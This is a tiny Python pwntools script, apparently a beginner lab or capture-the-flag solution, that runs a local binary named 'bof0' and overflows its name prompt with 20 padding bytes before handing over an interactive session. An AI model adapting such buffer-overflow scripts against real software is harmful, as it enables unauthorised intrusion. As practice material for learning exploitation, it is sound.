#!/usr/bin/python3

from pwn import *

p = process('./bof0')

p.sendlineafter(b'name?', b'x' * 20) 

p.interactive()